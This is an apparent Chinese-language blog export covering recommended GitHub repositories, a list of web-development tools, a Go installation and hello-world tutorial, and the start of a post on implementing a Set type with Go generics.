<h1 id="7-30秒代码"><a href="#7-30秒代码" class="headerlink" title="7. 30秒代码"></a>7. 30秒代码</h1><h2 id="30-seconds-of-code"><a href="#30-seconds-of-code" class="headerlink" title="30-seconds-of-code"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzMwLXNlY29uZHMvMzAtc2Vjb25kcy1vZi1jb2Rl">30-seconds-of-code<i class="fa fa-external-link-alt"></i></span></h2><p>优雅的用户界面、实用的搜索栏和解决 JavaScript 和 Python 中一些最常见问题的代码片段。程序员还能要求什么？一切尽在您的指尖。</p>
<h1 id="8-HTML-幻灯片"><a href="#8-HTML-幻灯片" class="headerlink" title="8. HTML 幻灯片"></a>8. HTML 幻灯片</h1><h2 id="reveal-js"><a href="#reveal-js" class="headerlink" title="reveal.js"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hha2ltZWwvcmV2ZWFsLmpz">reveal.js<i class="fa fa-external-link-alt"></i></span></h2><p>reveal.js 是一个开源的 HTML 演示制作工具。用它做的演示非常漂亮和优雅，尤其是涉及显示一些代码的演示。最好的部分是您可以对演示文稿做任何您可以对网络做的事情——改变它，根据您的心意设计它，等等。</p>
<h1 id="9-免费编程书籍"><a href="#9-免费编程书籍" class="headerlink" title="9. 免费编程书籍"></a>9. 免费编程书籍</h1><h2 id="free-programming-books"><a href="#free-programming-books" class="headerlink" title="free-programming-books"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rRm91bmRhdGlvbi9mcmVlLXByb2dyYW1taW5nLWJvb2tz">free-programming-books<i class="fa fa-external-link-alt"></i></span></h2><p>作为 Github 上最受欢迎和加星标的 repos 之一，免费编程书籍不仅有书名，还有一些很棒的免费在线课程、播客&#x2F;截屏视频。不仅如此，还有交互式编程资源、问题集、竞争性编程和备忘单。最棒的是——它有多种不同的语言版本。</p>
<p> <span class="exturl" data-url="aHR0cHM6Ly9lYm9va2ZvdW5kYXRpb24uZ2l0aHViLmlvLw==">ebookfoundation<i class="fa fa-external-link-alt"></i></span></p>
<h1 id="10-JavaScript-算法"><a href="#10-JavaScript-算法" class="headerlink" title="10. JavaScript 算法"></a>10. JavaScript 算法</h1><h2 id="javascript-algorithms"><a href="#javascript-algorithms" class="headerlink" title="javascript-algorithms"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RyZWtobGViL2phdmFzY3JpcHQtYWxnb3JpdGhtcw==">javascript-algorithms<i class="fa fa-external-link-alt"></i></span></h2><p>这个存储库包含许多流行算法和数据结构的基于 JavaScript 的示例。</p>
<h1 id="11-Web-开发者路线图"><a href="#11-Web-开发者路线图" class="headerlink" title="11. Web 开发者路线图"></a>11. Web 开发者路线图</h1><h2 id="developer-roadmap"><a href="#developer-roadmap" class="headerlink" title="developer-roadmap"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2thbXJhbmFobWVkc2UvZGV2ZWxvcGVyLXJvYWRtYXA=">developer-roadmap<i class="fa fa-external-link-alt"></i></span></h2><p>陷入僵局或需要入门建议？或者混淆框架和工具？那么这个回购是给你的。业主为初学者和专家都做了出色的工作。您将大致了解自己的位置和需要去的地方。</p>
<blockquote>
<p>这些路线图的目的是让您了解前景，并在您对下一步要学什么感到困惑时为您提供指导，而不是鼓励您选择时髦的东西。您应该逐渐了解为什么一种工具比另一种工具更适合某些情况，并记住时髦和时髦并不意味着最适合这项工作。</p>
<p>— 开发者路线图</p>
</blockquote>
<h1 id="12-编码面试大学"><a href="#12-编码面试大学" class="headerlink" title="12. 编码面试大学"></a>12. 编码面试大学</h1><h2 id="coding-interview-university"><a href="#coding-interview-university" class="headerlink" title="coding-interview-university"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2p3YXNoYW0vY29kaW5nLWludGVydmlldy11bml2ZXJzaXR5">coding-interview-university<i class="fa fa-external-link-alt"></i></span></h2><p>Coding Interview University 有一个为期数月的学习计划，目标是成为谷歌、亚马逊、Facebook、Netflix 或任何其他大型软件公司等大型科技公司的软件工程师。作者自己完成了这个学习计划，并被亚马逊聘为软件开发工程师。对于没有获得工程或 CS 学位的自学开发人员来说，这是一个很好的补充。</p>
<h1 id="13-开发者设计资源"><a href="#13-开发者设计资源" class="headerlink" title="13. 开发者设计资源"></a>13. 开发者设计资源</h1><h2 id="design-resources-for-developers"><a href="#design-resources-for-developers" class="headerlink" title="design-resources-for-developers"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JyYWR0cmF2ZXJzeS9kZXNpZ24tcmVzb3VyY2VzLWZvci1kZXZlbG9wZXJz">design-resources-for-developers<i class="fa fa-external-link-alt"></i></span></h2><p>此存储库包含设计和 UI 资源、库存照片、Web 模板、CSS 框架、UI 库、工具等的精选列表，可在您的项目和应用程序中免费使用。它提供了开始 Web 开发项目所需的所有模板内容。</p>
<p>Brad Traversy 是教人们编码领域的知名人士。我本人在 Udemy 和 YouTube 上过很多他的课程，毫无疑问他是一位了不起的老师。</p>
<p>就像他惊人的教学技巧一样，他为开发人员制作了一个一体化的 repo。我相信必须将此 repo 添加为书签，并且无论何时需要与 Web 开发相关的任何资源，都可以直接进入它。</p>
<p>它包含 UI 图形、字体、颜色、图标、库存照片、视频和音乐、模板、CSS 以及更多的东西。您需要查看此存储库才能真正欣赏它。</p>
<h1 id="14-前端开发面试题"><a href="#14-前端开发面试题" class="headerlink" title="14. 前端开发面试题"></a>14. 前端开发面试题</h1><h2 id="Front-end-Developer-Interview-Questions"><a href="#Front-end-Developer-Interview-Questions" class="headerlink" title="Front-end-Developer-Interview-Questions"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2g1YnAvRnJvbnQtZW5kLURldmVsb3Blci1JbnRlcnZpZXctUXVlc3Rpb25z">Front-end-Developer-Interview-Questions<i class="fa fa-external-link-alt"></i></span></h2><p>此存储库包含一系列与前端相关的问题，您可以使用它们来测试自己。我发现最好的用途是找出我需要处理前端的哪些部分。</p>
<h1 id="15-前端性能检查表"><a href="#15-前端性能检查表" class="headerlink" title="15. 前端性能检查表"></a>15. 前端性能检查表</h1><h2 id="Front-End-Performance-Checklist"><a href="#Front-End-Performance-Checklist" class="headerlink" title="Front-End-Performance-Checklist"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZWRhdmlkZGlhcy9Gcm9udC1FbmQtUGVyZm9ybWFuY2UtQ2hlY2tsaXN0">Front-End-Performance-Checklist<i class="fa fa-external-link-alt"></i></span></h2><p>前端性能清单是一个详尽的元素列表，您可以使用这些元素来确保您的网页具有足够的性能。</p>
<h1 id="16-很棒的设计工具"><a href="#16-很棒的设计工具" class="headerlink" title="16. 很棒的设计工具"></a>16. 很棒的设计工具</h1><h2 id="Awesome-Design-Tools"><a href="#Awesome-Design-Tools" class="headerlink" title="Awesome-Design-Tools"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvYWJzdHJhY3QvQXdlc29tZS1EZXNpZ24tVG9vbHM=">Awesome-Design-Tools<i class="fa fa-external-link-alt"></i></span></h2><p>这个 repo 包含可用的最佳设计工具的精选列表，以及包含与设计相关的资源（如 UI 工具包、库存照片、视频等）的网站。</p>
<h1 id="17-成为全栈网络开发者"><a href="#17-成为全栈网络开发者" class="headerlink" title="17. 成为全栈网络开发者"></a>17. 成为全栈网络开发者</h1><h2 id="Become-A-Full-Stack-Web-Developer"><a href="#Become-A-Full-Stack-Web-Developer" class="headerlink" title="Become-A-Full-Stack-Web-Developer"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Jtb3JlbGxpMjUvQmVjb21lLUEtRnVsbC1TdGFjay1XZWItRGV2ZWxvcGVy">Become-A-Full-Stack-Web-Developer<i class="fa fa-external-link-alt"></i></span></h2><p>如果您想成为或正在成为一名全栈 Web 开发人员，请前往此存储库。它包含您在成为全栈开发人员的过程中可能需要的一些最佳资源。JavaScript、React、Node、Python 等等</p>
<p>这就是本文的全部内容。我希望这篇文章对您有所帮助，并且它为您的生活增添了一些价值。</p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Github</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>7 个网站将改变您进行 Web 开发的方式</title>
    <url>/2022/12/devtools-web/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在本文中，我们将介绍 7 个最好的 Web 开发网站，它们将改变您进行 Web 开发的方式。这对于正在开发网站并且必须使用不同的数据、页面和设计测试其网站的每个版本的人很有帮助。</p>
<p>由于技术的快速发展，Web 开发不断变化。网站从来都不是一个人的工作，但是有很多人可以帮助您。但在这些技术的帮助下，开发过程变得比以往任何时候都容易。那么让我们开始探索吧。</p>
<span id="more"></span>

<h2 id="1-Jam"><a href="#1-Jam" class="headerlink" title="1. Jam"></a>1. Jam</h2><p>在几秒钟内报告错误，而不会中断您的工作流程。一键捕获您的屏幕和开发人员日志。它非常简单，并且与大多数问题跟踪器和工具紧密集成。Jam 自动神奇地创建包含所有信息工程师需要的错误报告，包括：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9qYW0uZGV2Lw==">jam.dev<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2-Blackbox"><a href="#2-Blackbox" class="headerlink" title="2. Blackbox"></a>2. Blackbox</h2><p>人工智能驱动的工具从任何视频中提取代码。只需从正在观看的任何视频中选择要复制的代码，然后将其粘贴到文本编辑器中即可。您可以从 Youtube、coursera、udemy 或 zoom 上的实时编码会话中的任何视频中提取代码。它支持所有编程语言，保持代码的正确缩进。</p>
<p>您可以轻松找到要使用的正确代码片段，而无需跳出您的环境、打开多个选项卡并滚动浏览文档和资源页面。它适用于每个文本编辑器、IDE、Web 浏览器。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudXNlYmxhY2tib3guaW8vbGFuZGluZ1BhZ2U=">useblackbox.io<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="3-Figstack"><a href="#3-Figstack" class="headerlink" title="3. Figstack"></a>3. Figstack</h2><p>另一个人工智能驱动的工具。Figstack 接受了数十亿行代码的训练，它将增强您跨语言读写代码的能力。您可以使用这个强大的工具快速理解和记录代码。</p>
<p>如果您需要将 Python 转换为 Go 或 Ruby 转换为 Javascript，那么这就是 go for 工具。<strong>语言翻译</strong>功能可让您可靠地从一种语言切换到另一种语言。它可以轻松地为您的功能自动化文档。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZmlnc3RhY2suY29tLw==">figstack.com<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="4-CodinGame"><a href="#4-CodinGame" class="headerlink" title="4. CodinGame"></a>4. CodinGame</h2><p>借助 CodinGame，程序员能够通过解决具有挑战性的问题、学习新概念并从最优秀的开发人员那里获得灵感来提高编码技能。它有助于建立和加强您的开发人员档案，并证明您作为业内大多数顶级公司的开发人员的价值。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY29kaW5nYW1lLmNvbS9zdGFydA==">codingame.com<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="5-Locofy"><a href="#5-Locofy" class="headerlink" title="5. Locofy"></a>5. Locofy</h2><p>将您的 Figma 设计转变为可用于移动和 Web 应用程序的生产就绪前端代码。使用现有的设计工具、技术堆栈和工作流程，将您的应用程序开发和部署速度提高 3–4 倍。Locofy 无缝集成，从设计到代码再到部署。以您的首选设置（CSS 模块、Tailwind、CSS、Typescript、JavaScript）导出您的代码或推送到 Github。您还可以使用 Netlify 或 Vercel 进行部署。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubG9jb2Z5LmFpLw==">locofy.ai<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="6-SourceAI"><a href="#6-SourceAI" class="headerlink" title="6. SourceAI"></a>6. SourceAI</h2><p>SourceAI 是一个工具，它可以从纯文本描述中为您生成任何语言的代码。只需用纯文本（英语、法语、德语、西班牙语等）描述您的应用程序需要做什么，并在几秒钟内开始使用它。您可以使用任何编程语言生成代码。SourceAI 使用的底层技术基于 GPT-3 语言模型。使用 SourceAI，开发过程复杂且耗时：</p>
<ul>
<li>节省开发时间</li>
<li>一键生成代码</li>
<li>更有效地利用你的时间</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9zb3VyY2VhaS5kZXYv">sourceai.dev<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="7-Wappalyzer"><a href="#7-Wappalyzer" class="headerlink" title="7. Wappalyzer"></a>7. Wappalyzer</h2><p>找出任何网站的技术堆栈。创建使用某些技术的网站列表，包括公司和联系方式。它的 API 提供对网站技术堆栈、公司和联系方式、社交媒体资料、电子邮件验证等的即时访问。授权您的销售和营销团队：</p>
<ul>
<li><strong>网站分析和浏览器扩展</strong></li>
<li><strong>领先一代</strong></li>
<li><strong>竞争对手分析</strong></li>
<li><strong>API 访问和安全侦察</strong></li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cud2FwcGFseXplci5jb20v">wappalyzer.com<i class="fa fa-external-link-alt"></i></span></p>
<p>希望这些信息对您有用。随意分享更多类似的网站。</p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
  </entry>
  <entry>
    <title>Go 中的 DevOps——你的第一个 Go 程序</title>
    <url>/2022/12/go-devops/</url>
    <content><![CDATA[<h2 id="Go-训练营系列中的-DevOps"><a href="#Go-训练营系列中的-DevOps" class="headerlink" title="Go 训练营系列中的 DevOps"></a>Go 训练营系列中的 DevOps</h2><h2 id="为什么在-Go-中使用-DevOps？"><a href="#为什么在-Go-中使用-DevOps？" class="headerlink" title="为什么在 Go 中使用 DevOps？"></a>为什么在 Go 中使用 DevOps？</h2><p>目前，大多数 DevOps 工程师都使用<code>Python</code>它作为他们的 DevOps 编程语言。但是<code>Python</code>伴随着一些编译时和服务扩展问题。</p>
<span id="more"></span>

<p>例如，简单地升级到新版本的 Python ( <code>Python2</code> to <code>Python3</code>, <code>Python3.7</code> to <code>Python3.11</code>) 可能会导致您现有的脚本停止工作。当出现兼容性问题时，回滚到旧版本的 Python 并不容易。</p>
<p>现在在云时代，<code>Go</code>已经成为云原生编排和应用的<em>事实</em>语言。<code>Go</code>随附您在工具可靠性和扩展能力方面取得巨大进步所需的所有工具。</p>
<p>快速浏览 Go 官方网站，您可以看到以下公司（以及更多公司）已经在使用 Go。</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9nb2xhbmcuZ29vZ2xlLmNuL3NvbHV0aW9ucy8jY2FzZS1zdHVkaWVz">https://golang.google.cn/solutions/#case-studies<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>比如：Docker-compose, kubernetes, istio, k3s, prometheus, argocd, terraform 等。你可以看到越来越多的云服务软件在使用<code>Go</code>。对于 DevOps 工程师，我个人认为采用 DevOps 编程语言很重要，它将帮助您掌握新的云原生应用程序，并使您在职业生涯中保持竞争力。</p>
<h2 id="Go版本"><a href="#Go版本" class="headerlink" title="Go版本"></a>Go版本</h2><p>如今，<code>Go</code>团队已经将版本的发布节奏稳定在每年两次大发布，通常是二月和八月。Go 团队承诺为最新的两个稳定主要版本的 Go 提供支持。</p>
<p>例如，如果最新的主要版本是<code>Go 1.17</code>，那么 Go 团队将提供对<code>Go 1.17</code>和<code>Go 1.16</code>提供支持。支持范围主要包括版本重大问题修复、文档变更、安全问题更新等。</p>
<p>我建议您选择最新<code>Go</code>版本。因为稳定版的平均质量<code>Go</code>一直都很高，很少有影响使用的大bug。您不必太担心新版本的支持。Google 自己的产品，例如 Google App Engine，将很快支持它。</p>
<h2 id="在-Linux-服务器上安装-Go-v1-19-3"><a href="#在-Linux-服务器上安装-Go-v1-19-3" class="headerlink" title="在 Linux 服务器上安装 Go v1.19.3"></a>在 Linux 服务器上安装 Go v1.19.3</h2><p><code>Go</code>支持几乎所有主流Linux发行版操作系统。常见的有Ubuntu、CentOS、Fedora、SUSE等，<code>Go</code>在这些主流的Linux发行版操作系统上的安装方法都是一样的（当然某些发行版也可能使用其软件安装管理器只提供自己的安装方法）。可以参考以下安装步骤（<span class="exturl" data-url="aHR0cHM6Ly9nb2xhbmcub3JnL2RvYy9pbnN0YWxsJUVGJUJDJTg5">https://golang.org/doc/install）<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li><code>Go v1.19.3</code>从其官网下载：</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">$ wget https:<span class="comment">//go.dev/dl/go1.19.3.linux-amd64.tar.gz                                                                                               --2022-11-08 08:12:19--  https://go.dev/dl/go1.19.3.linux-amd64.tar.gz</span></span><br><span class="line">...</span><br><span class="line">Saving to: ‘go1.<span class="number">19.3</span><span class="selector-class">.linux-amd64</span><span class="selector-class">.tar</span>.gz’</span><br><span class="line">go1.<span class="number">19.3</span><span class="selector-class">.linux-amd64</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span>                <span class="number">100%</span><span class="selector-attr">[======================================================================================&gt;]</span> <span class="number">142.01</span>M  <span class="number">13.2</span>MB/s    <span class="keyword">in</span> <span class="number">11s</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">11</span>-<span class="number">08</span> <span class="number">08</span>:<span class="number">12</span>:<span class="number">30</span> (<span class="number">13.2</span> MB/s) - ‘go1.<span class="number">19.3</span><span class="selector-class">.linux-amd64</span><span class="selector-class">.tar</span>.gz’ saved <span class="selector-attr">[148907134/148907134]</span></span><br></pre></td></tr></table></figure>

<ul>
<li>将 Go 二进制文件安装到“&#x2F;usr&#x2F;local&#x2F;bin”</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">rm</span> -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.19.3.linux-amd64.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> /usr/local</span></span><br><span class="line">bin  etc  games  go  include  lib  lib64  libexec  sbin  share  src</span><br></pre></td></tr></table></figure>

<ul>
<li>如果您已经这样做了，请把“&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin”添加到环境变量中</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:/usr/local/go/bin&#x27;</span> &gt;&gt; ~/.bashrc</span></span><br></pre></td></tr></table></figure>

<ul>
<li>检查 Go 版本</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">$ which <span class="keyword">go</span></span><br><span class="line">/usr/local/<span class="keyword">go</span>/bin/<span class="keyword">go</span></span><br><span class="line">$ <span class="keyword">go</span> <span class="keyword">version</span></span><br><span class="line"><span class="keyword">go</span> <span class="keyword">version</span> go1.<span class="number">19.3</span> linux/amd64</span><br></pre></td></tr></table></figure>

<h2 id="Go-Hello-world"><a href="#Go-Hello-world" class="headerlink" title="Go Hello world"></a>Go Hello world</h2><p>现在我们已经<code>Go</code>安装成功了，让我们来创建我们的第一个<code>Go</code>程序吧！</p>
<ul>
<li>在主目录下创建一个文件夹<code>godev</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> godev</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>godev</code>中创建文件夹<code>helloworld</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> godev</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> helloworld</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> helloworld</span></span><br></pre></td></tr></table></figure>

<ul>
<li>创建<code>main.go</code>文件内容如下（注意，在<code>Go</code>中，我们通常直接将多个单词拼接起来作为源文件名，而不是使用下划线或其他分隔符，这是因为下划线在<code>Go</code>中有特殊的作用）。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Hello, world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行：</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> fmt main.<span class="keyword">go</span></span><br><span class="line">$ <span class="keyword">go</span> run main.<span class="keyword">go</span></span><br><span class="line">Hello, world</span><br></pre></td></tr></table></figure>

<p>恭喜，你刚刚成功运行了你的第一个 go <code>helloworld</code>程序！</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>现在您已经成功运行了第一个 Go 程序，让我们检查每一行</p>
<p><code>package main</code></p>
<p>这定义了一个包<code>Go</code>。包是<code>Go</code>语言的基本单位，<code>Go</code>程序本质上是包的集合。</p>
<p>在我们的示例中，它告诉 Go 编译器创建可执行文件而不是库文件。如果您以不同的方式命名包，您将运行 int 以下错误：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="title">command-line-arguments </span><span class="keyword">is</span> <span class="keyword">not</span> a main <span class="keyword">package</span></span><br></pre></td></tr></table></figure>

<p>比如重命名为apple，如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> apple</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">&quot;Hello, world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果你想运行使用<code>go run main.go</code>：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> run main.<span class="keyword">go</span></span><br><span class="line">package <span class="keyword">command</span>-<span class="built_in">line</span>-arguments <span class="keyword">is</span> not <span class="keyword">a</span> main package</span><br></pre></td></tr></table></figure>

<p>但是您仍然可以构建它，但它不会生成任何可执行文件：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">$ <span class="keyword">go</span> build main.<span class="keyword">go</span></span><br><span class="line">$ <span class="keyword">ls</span></span><br><span class="line">main.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>

<h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>顾名思义，这个<code>import</code>关键字从 $GOPATH 目录（如果没有提到路径）或从提到的目录中导入指定的包。</p>
<p>在我们的例子中，<code>fmt</code>是一个包的名称，它也代表了包的导入路径，也就是<code>fmt</code>标准库下的目录。</p>
<h2 id="func"><a href="#func" class="headerlink" title="func"></a>func</h2><p><code>func</code>是 中的关键字<code>Go</code>，用于创建函数。语法如下：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">func <span class="built_in">function_name</span>(Parameter-list)(Return_type)&#123;</span><br><span class="line">    <span class="comment">// function body.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这里的</strong><code>main</code><strong>函数比较特殊：当你运行一个可执行</strong><code>Go</code><strong>程序时，所有的代码都会从这个入口函数开始运行。</strong></p>
<p><code>fmt.Println</code></p>
<p><code>fmt</code>包使用类似于 C 的 printf() 和 scanf() 函数的函数实现格式化 I&#x2F;O。该<code>fmt.Println()</code>函数使用默认格式的运算对象并写入标准输出。最后添加一个换行符。</p>
<h2 id="Go-IDE"><a href="#Go-IDE" class="headerlink" title="Go IDE"></a>Go IDE</h2><p>我推荐你使用<span class="exturl" data-url="aHR0cHM6Ly93d3cuamV0YnJhaW5zLmNvbS9nby9wcm9tby8=">GoLand<i class="fa fa-external-link-alt"></i></span>或<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20v">VsCode<i class="fa fa-external-link-alt"></i></span>。但是 GoLand 每月花费 19.90 美元或每年 199.00 美元。VsCode 是免费的，这就是我使用的。要使用 VsCode 设置 Go，您只需遵循 VsCode 官方文档。</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9sYW5ndWFnZXMvZ28=">https :&#x2F;&#x2F;code.visualstudio.com&#x2F;docs&#x2F;languages&#x2F;go<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>使用带有 Golang 泛型的集合</title>
    <url>/2022/12/go-generice/</url>
    <content><![CDATA[<h2 id="在-Go-中构建您自己的全功能-Set-类型"><a href="#在-Go-中构建您自己的全功能-Set-类型" class="headerlink" title="在 Go 中构建您自己的全功能 Set 类型"></a>在 Go 中构建您自己的全功能 Set 类型</h2><p>很多人学习 Go 时发现的一件更令人沮丧的事情是缺少集合类型，例如 Sets 及其常用操作。在本文中，我们将展示 Go 1.19 中泛型的引入如何让我们能够构建自己的功能齐全的 Set 类型。</p>
<p>您可能熟悉非常有用的数据收集类型 Set。Set 是唯一项的无序集合。通常集合是使用 Hashmap 实现的，Hashmap 查找值的时间复杂度为 O(1)（假设没有哈希冲突）。集合有 4 个主要操作，使它们特别有用：</p>
<span id="more"></span>

<ol>
<li>Union ( <strong>A</strong> ⋃ <strong>B</strong> ) — 并集是包含集合 A 和 B 中所有元素的集合。</li>
<li>Intersection ( <strong>A</strong> ∩ <strong>B</strong> ) — 交集是包含集合 A 和 B 中相交元素的集合。</li>
<li>Complement ( <strong>A</strong> c) — 补集是通用集合 S 中但不在 A 中的元素集合。<em>我们将忽略补集，因为它由 Difference 处理。</em></li>
<li>Difference ( <strong>A</strong> − <strong>B</strong> ) — 差集是 <strong>A</strong> 中但不在 <strong>B</strong> 中的元素的集合。</li>
</ol>
<p>让我们开始在 Go 中定义我们的 Set 类型。首先，我们要定义 Set 是什么，使用泛型我们可以利用约束轻松扩展 Set 类型以处理大量数据类型。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> collections</span><br><span class="line"></span><br><span class="line"><span class="comment">// A collection of unique comparable items. Uses a map with only true values</span></span><br><span class="line"><span class="comment">// to accomplish set functionality.</span></span><br><span class="line"><span class="keyword">type</span> Set[T comparable] <span class="keyword">map</span>[T]<span class="type">bool</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a new empty set with the specified initial size.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewSet</span>[<span class="title">T</span> <span class="title">comparable</span>]<span class="params">(size <span class="type">int</span>)</span></span> Set[T] &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">make</span>(Set[T], size)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add a new key to the set</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Set[T])</span></span> Add(key T) &#123;</span><br><span class="line">    s[key] = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove a key from the set. If the key is not in the set then noop</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Set[T])</span></span> Remove(key T) &#123;</span><br><span class="line">    <span class="built_in">delete</span>(s, key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if Set s contains key</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s Set[T])</span></span> Contains(key T) <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> s[key]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在第一部分中，我们创建了使用内置地图类型的 Set 类型。我们将映射的键限制为 Comparable 类型。从文档中，我们知道 Comparable 类型包括</p>
<blockquote>
<p>（布尔值、数字、字符串、指针、通道、可比较类型的数组、字段都是可比较类型的结构）</p>
</blockquote>
<p>我们还在我们的类型上添加了一些基本方法，用于添加、删除和检查是否存在。有了这个，我们还没有准备好开始实施上面定义的 Set 操作。让我们从 <code>Difference</code> 开始。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A difference B | <span class="doctag">NOTE:</span> A-B != B-A</span></span><br><span class="line">func (<span class="selector-tag">a</span> Set<span class="selector-attr">[T]</span>) <span class="built_in">Difference</span>(<span class="selector-tag">b</span> Set<span class="selector-attr">[T]</span>) Set<span class="selector-attr">[T]</span> &#123;</span><br><span class="line">    resultSet := NewSet<span class="selector-attr">[T]</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> key := range <span class="selector-tag">a</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> !<span class="selector-tag">b</span><span class="selector-class">.Contains</span>(key) &#123;</span><br><span class="line">             resultSet<span class="selector-class">.Add</span>(key)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return resultSet</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当简单的例子。我们简单地创建一个容量为 0 的新 Set（因为我们不知道新 Set 有多大），然后迭代 Set <code>A</code> 只添加不包含在 <code>B</code>。</p>
<p>接下来的两个操作 <code>Union</code> 和 <code>Intersection</code>  遵循类似的模式 — 但这次我们添加了一个轻微的优化。</p>
